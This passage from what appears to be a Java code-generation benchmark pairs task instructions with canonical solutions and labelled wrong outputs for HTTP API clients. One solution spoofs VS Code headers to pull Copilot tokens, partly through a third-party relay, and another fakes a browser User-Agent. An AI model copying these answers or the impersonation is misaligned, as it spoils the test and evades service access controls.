    "wrong_result": "public class BeaconClient {\n    private final int port;\n    private final String token;\n    private final HttpClient httpClient;\n    private final ObjectMapper objectMapper;\n\n    public BeaconClient(int port, String token) {\n        this.port = port;\n        this.token = token;\n        this.httpClient = HttpClient.newBuilder().build();\n        this.objectMapper = new ObjectMapper();\n    }\n\n    public <RES> RES performRequest(BeaconInterface<?> prov, String rawNode) throws Exception {\n        String url = \"http://localhost:\" + port + \"/\" + rawNode;\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .header(\"Content-Type\", \"application/json\")\n                .header(\"Authorization\", \"Bearer \" + (token != null ? token : \"\"))\n                .POST(HttpRequest.BodyPublishers.ofString(prov.getContent()))\n                .build();\n\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            return parseClientError(response).orElseThrow(() -> new RuntimeException(\"Client error\"));\n        } else if (response.statusCode() >= 500) {\n            return parseServerError(response).orElseThrow(() -> new RuntimeException(\"Server error\"));\n        }\n\n        return objectMapper.readValue(response.body(), (Class<RES>) prov.getResponseClass());\n    }\n\n    public <REQ, RES> RES performRequest(REQ req) throws Exception {\n        String endpoint = determineEndpoint(req.getClass());\n        String url = \"http://localhost:\" + port + endpoint;\n\n        String json = objectMapper.writeValueAsString(req);\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(url))\n                .header(\"Content-Type\", \"application/json\")\n                .header(\"Authorization\", \"Bearer \" + (token != null ? token : \"\"))\n                .POST(HttpRequest.BodyPublishers.ofString(json))\n                .build();\n\n        HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n        if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            return parseClientError(response).orElseThrow(() -> new RuntimeException(\"Client error\"));\n        } else if (response.statusCode() >= 500) {\n            return parseServerError(response).orElseThrow(() -> new RuntimeException(\"Server error\"));\n        }\n\n        return objectMapper.readValue(response.body(), (Class<RES>) getResponseClass(req.getClass()));\n    }\n\n    private String determineEndpoint(Class<?> clazz) {\n        // Implement logic to determine endpoint based on request type\n        return \"/api/\" + clazz.getSimpleName().toLowerCase();\n    }\n\n    private Class<?> getResponseClass(Class<?> clazz) {\n        // Implement logic to determine response class based on request type\n        return clazz;\n    }\n\n    public Optional<BeaconClientErrorResponse> parseClientError(HttpResponse<String> response) {\n        if (response.statusCode() >= 400 && response.statusCode() < 500) {\n            try {\n                return Optional.of(objectMapper.readValue(response.body(), BeaconClientErrorResponse.class));\n            } catch (Exception e) {\n                return Optional.empty();\n            }\n        }\n        return Optional.empty();\n    }\n\n    public Optional<BeaconServerErrorResponse> parseServerError(HttpResponse<String> response) {\n        if (response.statusCode() >= 500) {\n            try {\n                return Optional.of(objectMapper.readValue(response.body(), BeaconServerErrorResponse.class));\n            } catch (Exception e) {\n                return Optional.empty();\n            }\n        }\n        return Optional.empty();\n    }\n}"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Java class that implements geocoding functionality using the GraphHopper API, allowing both forward and reverse geocoding operations through HTTP requests.\n\nClass Description: The GraphHopperGeocoding class provides methods to perform geocoding operations by communicating with the GraphHopper API service. It handles HTTP client configuration, request building, response processing, and error handling.\n\nAttributes:\n- objectMapper: ObjectMapper - Used for JSON serialization/deserialization\n- downloader: OkHttpClient - HTTP client for making requests\n- routeServiceUrl: String - Base URL for the GraphHopper geocoding API\n- key: String - API key for authentication\n- DEFAULT_TIMEOUT: long - Default timeout value for HTTP requests (5000ms)\n\nMethods:\n- GraphHopperGeocoding() -> Constructor - Initializes with default GraphHopper API URL\n- GraphHopperGeocoding(String serviceUrl) -> Constructor - Initializes with custom service URL\n- geocode(GHGeocodingRequest request) -> GHGeocodingResponse - Performs geocoding operation based on request parameters\n- setDownloader(OkHttpClient downloader) -> GraphHopperGeocoding - Sets custom HTTP client\n- setKey(String key) -> void - Sets API key for authentication\n- getDownloader() -> OkHttpClient - Returns current HTTP client instance\n- getClientForRequest(GHGeocodingRequest request) -> OkHttpClient - Returns configured HTTP client with appropriate timeout\n- buildUrl(GHGeocodingRequest request) -> String - Constructs API request URL with proper parameters\n- encodeURL(String str) -> String - URL-encodes string parameters (private helper method)",
    "Canonical_solution": "import com.fasterxml.jackson.databind.ObjectMapper;\nimport com.graphhopper.api.model.GHGeocodingRequest;\nimport com.graphhopper.api.model.GHGeocodingResponse;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\n\nimport java.io.IOException;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URLEncoder;\nimport java.util.concurrent.TimeUnit;\n\nimport static com.graphhopper.api.GraphHopperWeb.X_GH_CLIENT_VERSION;\nimport static com.graphhopper.api.Version.GH_VERSION_FROM_MAVEN;\n\npublic class GraphHopperGeocoding {\n\n    private final ObjectMapper objectMapper;\n    private OkHttpClient downloader;\n    private String routeServiceUrl;\n    private String key = \"\";\n    private final long DEFAULT_TIMEOUT = 5000;\n\n    public GraphHopperGeocoding() {\n        this(\"https://graphhopper.com/api/1/geocode\");\n    }\n\n    public GraphHopperGeocoding(String serviceUrl) {\n        this.routeServiceUrl = serviceUrl;\n        downloader = new OkHttpClient.Builder().\n                connectTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS).\n                build();\n        objectMapper = new ObjectMapper();\n    }\n\n    public GHGeocodingResponse geocode(GHGeocodingRequest request) {\n        String url = buildUrl(request);\n        try {\n            Request okRequest = new Request.Builder().url(url)\n                    .header(X_GH_CLIENT_VERSION, GH_VERSION_FROM_MAVEN)\n                    .build();\n            Response rsp = getClientForRequest(request).newCall(okRequest).execute();\n            ResponseBody rspBody = rsp.body();\n            if (!rsp.isSuccessful())\n                throw new RuntimeException(rspBody.string());\n            GHGeocodingResponse geoRsp = objectMapper.readValue(rspBody.bytes(), GHGeocodingResponse.class);\n            return geoRsp;\n        } catch (IOException ex) {\n            throw new RuntimeException(\"IO problem for geocoding URL \" + url + \": \" + ex.getMessage(), ex);\n        }\n    }\n\n    public GraphHopperGeocoding setDownloader(OkHttpClient downloader) {\n        this.downloader = downloader;\n        return this;\n    }\n\n    public void setKey(String key) {\n        this.key = key;\n    }\n\n    public OkHttpClient getDownloader() {\n        return downloader;\n    }\n\n    private OkHttpClient getClientForRequest(GHGeocodingRequest request) {\n        OkHttpClient client = this.downloader;\n        if (request.hasTimeout()) {\n            long timeout = request.getTimeout();\n            client = client.newBuilder()\n                    .connectTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .readTimeout(timeout, TimeUnit.MILLISECONDS)\n                    .build();\n        }\n        return client;\n    }\n\n    private String buildUrl(GHGeocodingRequest request) {\n        String url = routeServiceUrl + \"?\";\n        if (request.isReverse()) {\n            if (!request.getPoint().isValid())\n                throw new IllegalArgumentException(\"For reverse geocoding you have to pass valid lat and long values\");\n            url += \"reverse=true\";\n        } else {\n            if (request.getQuery() == null)\n                throw new IllegalArgumentException(\"For forward geocoding you have to a string for the query\");\n            url += \"reverse=false\";\n            url += \"&q=\" + encodeURL(request.getQuery());\n        }\n\n        if (request.getPoint().isValid())\n            url += \"&point=\" + request.getPoint().getLat() + \",\" + request.getPoint().getLon();\n\n        url += \"&limit=\" + request.getLimit();\n        url += \"&locale=\" + encodeURL(request.getLocale());\n        url += \"&provider=\" + encodeURL(request.getProvider());\n\n        if (!key.isEmpty()) {\n            url += \"&key=\" + encodeURL(key);\n        }\n        return url;\n    }\n\n    private static String encodeURL(String str) {\n        try {\n            return URLEncoder.encode(str, \"UTF-8\");\n        } catch (UnsupportedEncodingException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "public class GraphHopperGeocoding {\n    private static final long DEFAULT_TIMEOUT = 5000;\n    private ObjectMapper objectMapper;\n    private OkHttpClient downloader;\n    private String routeServiceUrl;\n    private String key;\n\n    public GraphHopperGeocoding() {\n        this.routeServiceUrl = \"https://graphhopper.com/api/1/geocode\";\n        this.downloader = new OkHttpClient.Builder()\n                .readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .writeTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .build();\n        this.objectMapper = new ObjectMapper();\n    }\n\n    public GraphHopperGeocoding(String serviceUrl) {\n        this.routeServiceUrl = serviceUrl;\n        this.downloader = new OkHttpClient.Builder()\n                .readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .writeTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .build();\n        this.objectMapper = new ObjectMapper();\n    }\n\n    public GHGeocodingResponse geocode(GHGeocodingRequest request) {\n        String url = buildUrl(request);\n        Request httpRequest = new Request.Builder()\n                .url(url)\n                .build();\n        try (Response response = getClientForRequest(request).newCall(httpRequest).execute()) {\n            if (!response.isSuccessful()) {\n                throw new RuntimeException(\"Unexpected code \" + response);\n            }\n            String responseBody = response.body().string();\n            return objectMapper.readValue(responseBody, GHGeocodingResponse.class);\n        } catch (IOException | JsonProcessingException e) {\n            throw new RuntimeException(\"Error during geocoding\", e);\n        }\n    }\n\n    public void setDownloader(OkHttpClient downloader) {\n        this.downloader = downloader;\n    }\n\n    public void setKey(String key) {\n        this.key = key;\n    }\n\n    public OkHttpClient getDownloader() {\n        return downloader;\n    }\n\n    public OkHttpClient getClientForRequest(GHGeocodingRequest request) {\n        return downloader.newBuilder()\n                .readTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .writeTimeout(DEFAULT_TIMEOUT, TimeUnit.MILLISECONDS)\n                .build();\n    }\n\n    private String buildUrl(GHGeocodingRequest request) {\n        StringBuilder url = new StringBuilder(routeServiceUrl);\n        url.append('?');\n        if (request.getQuery() != null) {\n            url.append(\"q=\").append(encodeURL(request.getQuery()));\n        } else if (request.getPoint() != null) {\n            url.append(\"point=\").append(encodeURL(request.getPoint()));\n        }\n        if (key != null) {\n            url.append(\"&key=\").append(encodeURL(key));\n        }\n        return url.toString();\n    }\n\n    private String encodeURL(String str) throws UnsupportedEncodingException {\n        return URLEncoder.encode(str, StandardCharsets.UTF_8);\n    }\n}"
  },
  {
    "Task_id": 243,
    "Instruction": "Task Description: Create a Java class that interacts with the Danbooru API to fetch and process image posts, including retrieving pages of posts, extracting image URLs, and parsing tags from URLs.\n\nClass Description: The DanbooruApiClient class provides functionality to interact with the Danbooru image board API. It handles HTTP requests to fetch posts, processes JSON responses, and extracts relevant information from URLs.\n\nAttributes:\n- DOMAIN: [String] - The domain name of the Danbooru service\n- client: [OkHttpClient] - HTTP client instance for making requests\n- gidPattern: [Pattern] - Regular expression pattern for parsing tags from URLs\n- currentPageNum: [int] - Tracks the current page number for pagination\n\nMethods:\n- Constructor: DanbooruApiClient() -> [void] - Initializes the HTTP client with timeout settings\n- getPage: [int pageNum] -> [JSONObject] - Fetches a page of posts from Danbooru API with the specified page number, returns posts as JSON object\n- extractUrlsFromJson: [JSONObject json] -> [List<String>] - Extracts image URLs from the JSON response and returns them as a list\n- getTagFromUrl: [URL url] -> [String] - Parses and returns the tag component from a Danbooru URL, throws MalformedURLException if URL format is invalid",
    "Canonical_solution": "import com.rarchives.ripme.utils.Utils;\nimport okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\n\nimport java.io.IOException;\nimport java.net.MalformedURLException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class DanbooruApiClient {\n    private static final String DOMAIN = \"danbooru.donmai.us\";\n    private final OkHttpClient client;\n    private Pattern gidPattern = null;\n    private int currentPageNum = 1;\n\n    public DanbooruApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .readTimeout(60, TimeUnit.SECONDS)\n                .writeTimeout(60, TimeUnit.SECONDS)\n                .build();\n    }\n\n    public JSONObject getPage(int pageNum) throws MalformedURLException {\n        Request request = new Request.Builder()\n                .url(\"https://\" + DOMAIN + \"/posts.json?page=\" + pageNum)\n                .header(\"User-Agent\", \"Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1\")\n                .header(\"Accept\", \"application/json,text/javascript,*/*;q=0.01\")\n                .header(\"Accept-Language\", \"en-US,en;q=0.9\")\n                .header(\"Sec-Fetch-Dest\", \"empty\")\n                .header(\"Sec-Fetch-Mode\", \"cors\")\n                .header(\"Sec-Fetch-Site\", \"same-origin\")\n                .header(\"Referer\", \"https://danbooru.donmai.us/\")\n                .header(\"X-Requested-With\", \"XMLHttpRequest\")\n                .header(\"Connection\", \"keep-alive\")\n                .build();\n\n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n\n            String responseData = response.body().string();\n            JSONArray jsonArray = new JSONArray(responseData);\n            if (!jsonArray.isEmpty()) {\n                return new JSONObject(\"{ \\\"resources\\\":\" + jsonArray + \" }\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> res = new ArrayList<>(100);\n        JSONArray jsonArray = json.getJSONArray(\"resources\");\n        for (int i = 0; i < jsonArray.length(); i++) {\n            if (jsonArray.getJSONObject(i).has(\"file_url\")) {\n                res.add(jsonArray.getJSONObject(i).getString(\"file_url\"));\n            }\n        }\n        return res;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        gidPattern = Pattern.compile(\"https?://danbooru.donmai.us/(posts)?.*([?&]tags=([^&]*)(?:&z=([0-9]+))?$)\");\n        Matcher m = gidPattern.matcher(url.toExternalForm());\n\n        if (m.matches()) {\n            return m.group(3);\n        }\n\n        throw new MalformedURLException(\"Expected danbooru URL format: \" + DOMAIN + \"/posts?tags=searchterm - got \" + url + \" instead\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport org.json.JSONArray;\nimport org.json.JSONObject;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class DanbooruApiClient {\n    private final String DOMAIN = \"https://danbooru.donmai.us\";\n    private final OkHttpClient client;\n    private final Pattern gidPattern;\n    private int currentPageNum = 1;\n\n    public DanbooruApiClient() {\n        client = new OkHttpClient.Builder()\n                .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .readTimeout(10, java.util.concurrent.TimeUnit.SECONDS)\n                .build();\n        gidPattern = Pattern.compile(\"^https?://[^/]+/post/show/\\\\d+/([^?]+)$\");\n    }\n\n    public JSONObject getPage(int pageNum) throws Exception {\n        currentPageNum = pageNum;\n        String url = DOMAIN + \"/posts.json?page=\" + pageNum;\n        Request request = new Request.Builder().url(url).build();\n        Response response = client.newCall(request).execute();\n        if (!response.isSuccessful()) throw new IOException(\"Unexpected code \" + response);\n        String json = response.body().string();\n        return new JSONObject(json);\n    }\n\n    public List<String> extractUrlsFromJson(JSONObject json) {\n        List<String> urls = new ArrayList<>();\n        JSONArray posts = json.getJSONArray(\"posts\");\n        for (int i = 0; i < posts.length(); i++) {\n            JSONObject post = posts.getJSONObject(i);\n            String fileUrl = post.getString(\"file_url\");\n            urls.add(fileUrl);\n        }\n        return urls;\n    }\n\n    public String getTagFromUrl(URL url) throws MalformedURLException {\n        Matcher matcher = gidPattern.matcher(url.toString());\n        if (!matcher.matches()) {\n            throw new MalformedURLException(\"Invalid URL format\");\n        }\n        return matcher.group(1);\n    }\n}"
  },
  {
    "Task_id": 244,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for expanding medical terminology value sets using the OkHttp library.\n\nClass Description: The TerminologyServiceClient class provides functionality to interact with a FHIR terminology service to expand value sets. It handles HTTP requests and responses, URL validation, and error handling.\n\nAttributes:\n- client: OkHttpClient - A shared HTTP client instance for making requests\n- urlValidator: UrlValidator - A validator for checking URL formats with support for double slashes\n- expandBaseUrl: String - The base URL for the value set expansion endpoint\n\nMethods:\n- setBaseUrl(String url) -> void - Sets the base URL for the terminology service by appending the value set expansion endpoint path\n- expandValueSet(String valueSetUri) -> Response - Makes a GET request to expand a value set, validates the input URI, and returns the HTTP response",
    "Canonical_solution": "import okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport okhttp3.ResponseBody;\nimport org.apache.commons.validator.routines.UrlValidator;\n\npublic class TerminologyServiceClient {\n    private static OkHttpClient client = new OkHttpClient();\n    private static UrlValidator urlValidator = new UrlValidator(UrlValidator.ALLOW_2_SLASHES);\n    private static String expandBaseUrl;\n\n    public static void setBaseUrl(String url) {\n        expandBaseUrl = url + \"/ValueSet/$expand?url=\";\n    }\n\n    public static Response expandValueSet(String valueSetUri) {\n        if (!urlValidator.isValid(valueSetUri)) {\n            throw new IllegalArgumentException(\"Invalid ValueSet URI\");\n        }\n\n        Request request = new Request.Builder()\n                .url(expandBaseUrl + valueSetUri)\n                .header(\"Accept\", \"application/json\")\n                .build();\n\n        try {\n            Response response = client.newCall(request).execute();\n            ResponseBody body = response.body();\n            if (body == null) {\n                throw new RuntimeException(\"Value Set Expansion contained no body\");\n            }\n            return response;\n        } catch (IOException e) {\n            throw new RuntimeException(\"Issue when expanding the value set\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import okhttp3.OkHttpClient;\nimport okhttp3.Request;\nimport okhttp3.Response;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class TerminologyServiceClient {\n    private final OkHttpClient client;\n    private final UrlValidator urlValidator;\n    private String expandBaseUrl;\n\n    public TerminologyServiceClient(UrlValidator urlValidator) {\n        this.client = new OkHttpClient();\n        this.urlValidator = urlValidator;\n        this.expandBaseUrl = \"\";\n    }\n\n    public void setBaseUrl(String url) {\n        this.expandBaseUrl = url + \"/ValueSet/$expand\";\n    }\n\n    public Response expandValueSet(String valueSetUri) {\n        if (!urlValidator.isValid(valueSetUri)) {\n            return new Response.Builder()\n                    .code(400)\n                    .message(\"Invalid value set URI\")\n                    .body(\"Invalid value set URI\".getBytes(StandardCharsets.UTF_8))\n                    .request(new Request.Builder().url(expandBaseUrl).build())\n                    .protocol(Protocol.HTTP_1_1)\n                    .build();\n        }\n\n        try {\n            String encodedUri = URLEncoder.encode(valueSetUri, StandardCharsets.UTF_8.toString());\n            String fullUrl = expandBaseUrl + \"?url=\" + encodedUri;\n            Request request = new Request.Builder()\n                    .url(fullUrl)\n                    .get()\n                    .build();\n            return client.newCall(request).execute();\n        } catch (Exception e) {\n            return new Response.Builder()\n                    .code(500)\n                    .message(\"Internal server error\")\n                    .body(\"Internal server error\".getBytes(StandardCharsets.UTF_8))\n                    .request(new Request.Builder().url(expandBaseUrl).build())\n                    .protocol(Protocol.HTTP_1_1)\n                    .build();\n        }\n    }\n}"
  },
  {
    "Task_id": 245,
    "Instruction": "Task Description: Create a Java class that implements a RESTful API client for interacting with GitHub Copilot and CoCoPilot services, including token retrieval and request execution capabilities.\n\nClass Description: The ApiClient class provides functionality to interact with GitHub Copilot and CoCoPilot APIs. It handles HTTP requests, manages headers, and processes responses. The class maintains a reusable HTTP client with configurable timeouts and generates unique identifiers for tracking requests.\n\nAttributes:\n- client: OkHttpClient - The HTTP client instance used for making requests\n- machineId: String - A unique identifier generated for the machine (static final)\n\nMethods:\n- ApiClient() -> None - Constructor that initializes the HTTP client with timeout configurations\n- generateMachineId() -> String - Generates a unique machine identifier using UUID (private static)\n- getCopilotToken(String apiKey) -> String - Retrieves a Copilot token using the provided API key\n- getCoCoToken(String apiKey) -> String - Retrieves a CoCoPilot token using the provided API key\n- executeRequest(String url, String method, String body, Map<String, String> headers) -> Response - Executes a generic HTTP request with specified parameters\n- createHeaders(String chatToken) -> Map<String, String> - Creates a standard set of headers for API requests using the provided chat token",
    "Canonical_solution": "import com.alibaba.fastjson2.JSON;\nimport okhttp3.*;\nimport org.json.JSONException;\nimport org.json.JSONObject;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.TimeUnit;\n\npublic class ApiClient {\n    private final OkHttpClient client;\n    private static final String machineId = generateMachineId();\n\n    public ApiClient() {\n        this.client = new OkHttpClient.Builder()\n                .connectTimeout(3, TimeUnit.MINUTES)\n                .readTimeout(5, TimeUnit.MINUTES)\n                .writeTimeout(5, TimeUnit.MINUTES)\n                .build();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.github.com/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.github.com\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public String getCoCoToken(String apiKey) throws IOException {\n        Request request = new Request.Builder()\n                .url(\"https://api.cocopilot.org/copilot_internal/v2/token\")\n                .addHeader(\"Host\", \"api.cocopilot.org\")\n                .addHeader(\"authorization\", \"token \" + apiKey)\n                .addHeader(\"Editor-Version\", \"vscode/1.85.0\")\n                .addHeader(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\")\n                .addHeader(\"User-Agent\", \"GitHubCopilotChat/0.11.1\")\n                .addHeader(\"Accept\", \"*/*\")\n                .build();\n        \n        try (Response response = client.newCall(request).execute()) {\n            if (!response.isSuccessful()) {\n                return null;\n            }\n            String responseBody = response.body().string();\n            JSONObject jsonResponse = new JSONObject(responseBody);\n            return jsonResponse.has(\"token\") ? jsonResponse.get(\"token\").toString() : null;\n        } catch (JSONException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) throws IOException {\n        MediaType JSON = MediaType.get(\"application/json; charset=utf-8\");\n        RequestBody requestBody = RequestBody.create(body, JSON);\n        \n        Request.Builder requestBuilder = new Request.Builder()\n                .url(url);\n        \n        if (\"POST\".equalsIgnoreCase(method)) {\n            requestBuilder.post(requestBody);\n        } else if (\"GET\".equalsIgnoreCase(method)) {\n            requestBuilder.get();\n        }\n        \n        headers.forEach(requestBuilder::addHeader);\n        Request request = requestBuilder.build();\n        \n        return client.newCall(request).execute();\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headersMap = new HashMap<>();\n        headersMap.put(\"Host\", \"api.githubcopilot.com\");\n        headersMap.put(\"Accept-Encoding\", \"gzip, deflate, br\");\n        headersMap.put(\"Accept\", \"*/*\");\n        headersMap.put(\"Authorization\", \"Bearer \" + chatToken);\n        headersMap.put(\"X-Request-Id\", UUID.randomUUID().toString());\n        headersMap.put(\"X-Github-Api-Version\", \"2023-07-07\");\n        headersMap.put(\"Vscode-Sessionid\", UUID.randomUUID().toString() + System.currentTimeMillis());\n        headersMap.put(\"vscode-machineid\", machineId);\n        headersMap.put(\"Editor-Version\", \"vscode/1.85.0\");\n        headersMap.put(\"Editor-Plugin-Version\", \"copilot-chat/0.11.1\");\n        headersMap.put(\"Openai-Organization\", \"github-copilot\");\n        headersMap.put(\"Copilot-Integration-Id\", \"vscode-chat\");\n        headersMap.put(\"Openai-Intent\", \"conversation-panel\");\n        headersMap.put(\"User-Agent\", \"GitHubCopilotChat/0.11.1\");\n        return headersMap;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 22,
    "wrong_result": "import okhttp3.*;\nimport java.util.*;\n\npublic class ApiClient {\n    private static final String MACHINE_ID = generateMachineId();\n    private final OkHttpClient client;\n\n    public ApiClient() {\n        client = new OkHttpClient.Builder()\n                .connectTimeout(10, TimeUnit.SECONDS)\n                .readTimeout(10, TimeUnit.SECONDS)\n                .build();\n    }\n\n    private static String generateMachineId() {\n        return UUID.randomUUID().toString();\n    }\n\n    public String getCopilotToken(String apiKey) {\n        String url = \"https://api.github.com/copilot_tokens\";\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + apiKey);\n        String body = \"\";\n        Response response = executeRequest(url, \"POST\", body, headers);\n        String responseBody = response.body().string();\n        int start = responseBody.indexOf(\"\\\"token\\\": \\\"\") + 10;\n        int end = responseBody.indexOf(\"\\\"\", start);\n        return responseBody.substring(start, end);\n    }\n\n    public String getCoCoToken(String apiKey) {\n        String url = \"https://api.cocopilot.com/token\";\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + apiKey);\n        String body = \"\";\n        Response response = executeRequest(url, \"POST\", body, headers);\n        String responseBody = response.body().string();\n        int start = responseBody.indexOf(\"\\\"token\\\": \\\"\") + 10;\n        int end = responseBody.indexOf(\"\\\"\", start);\n        return responseBody.substring(start, end);\n    }\n\n    public Response executeRequest(String url, String method, String body, Map<String, String> headers) {\n        Request.Builder requestBuilder = new Request.Builder().url(url);\n        if (method != null) {\n            requestBuilder.method(method, RequestBody.create(body, MediaType.get(\"application/json; charset=utf-8\")));\n        }\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                requestBuilder.addHeader(entry.getKey(), entry.getValue());\n            }\n        }\n        Request request = requestBuilder.build();\n        try {\n            return client.newCall(request).execute();\n        } catch (IOException e) {\n            throw new RuntimeException(\"Error executing request\", e);\n        }\n    }\n\n    public Map<String, String> createHeaders(String chatToken) {\n        Map<String, String> headers = new HashMap<>();\n        headers.put(\"Authorization\", \"Bearer \" + chatToken);\n        headers.put(\"User-Agent\", \"ApiClient\");\n        headers.put(\"X-Machine-ID\", MACHINE_ID);\n        return headers;\n    }\n}"
  },
  {
    "Task_id": 248,
    "Instruction": "Task Description: Create a Java utility class for making HTTP requests using OkHttp library, supporting GET and POST methods with configurable headers, parameters, and retry mechanism.\n\nClass Description: HttpUtil is a utility class that provides static methods for making HTTP requests. It handles both GET and POST requests with support for headers, query parameters, and form parameters. The class includes built-in timeout settings and a retry mechanism for failed requests.\n\nAttributes:\n- QUESTION_SEPARATE: String - Constant for URL question mark separator\n- PARAM_SEPARATE: String - Constant for URL parameter separator\n- KV_SEPARATE: String - Constant for key-value separator in URLs\n- client: OkHttpClient - Pre-configured HTTP client instance with timeout settings\n\nMethods:\n- doGet(String url) -> Resp - Executes a GET request to the specified URL\n- doGetWithHeader(String url, Map<String, String> headers) -> Resp - Executes a GET request with custom headers\n- doGet(String url, Map<String, String> params) -> Resp - Executes a GET request with URL parameters\n- doPost(String url) -> Resp - Executes a POST request to the specified URL\n- doPost(String url, Map<String, String> params) -> Resp - Executes a POST request with form parameters\n- executeRequest(Request request, int retryTime) -> Resp - Internal method to execute requests with retry logic\n- bodyToString(ResponseBody body) -> String - Helper method to convert response body to string\n\nNested Class: Resp\n- Description: Represents the HTTP response with status code, body, and optional message\n- Attributes:\n  - code: int - HTTP status code\n  - body: String - Response body content\n  - message: String - Optional message (used for errors)\n- Methods:\n  - builder() -> RespBuilder - Creates a new RespBuilder instance\n  - getCode() -> int - Returns the status code\n  - getBody() -> String - Returns the response body\n  - getMessage() -> String - Returns the message\n\nNested Class: RespBuilder\n- Description: Builder pattern implementation for constructing Resp objects\n- Methods:\n  - code(int code) -> RespBuilder - Sets the status code\n  - body(String body) -> RespBuilder - Sets the response body\n  - message(String message) -> RespBuilder - Sets the message\n  - build() -> Resp - Constructs the Resp object",
    "Canonical_solution": "import okhttp3.*;\nimport org.apache.commons.collections4.MapUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpUtil {\n\n    private static final String QUESTION_SEPARATE = \"?\";\n    private static final String PARAM_SEPARATE = \"&\";\n    private static final String KV_SEPARATE = \"=\";\n\n    private static final OkHttpClient client = new OkHttpClient().newBuilder()\n            .connectTimeout(3, TimeUnit.SECONDS)\n            .readTimeout(10, TimeUnit.SECONDS)\n            .writeTimeout(10, TimeUnit.SECONDS)\n            .build();\n\n    public static Resp doGet(String url) {\n        return executeRequest(new Request.Builder().get().url(url).build());\n    }\n\n    public static Resp doGetWithHeader(String url, Map<String, String> headers) {\n        final Request.Builder builder = new Request.Builder().get().url(url);\n        if (MapUtils.isNotEmpty(headers)) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                builder.header(entry.getKey(), entry.getValue());\n            }\n        }\n        return executeRequest(builder.build());\n    }\n\n    public static Resp doGet(String url, Map<String, String> params) {\n        StringBuilder builder = new StringBuilder(url);\n        if (!StringUtils.contains(url, QUESTION_SEPARATE)) {\n            builder.append(QUESTION_SEPARATE).append(\"_r=1\");\n        }\n        if 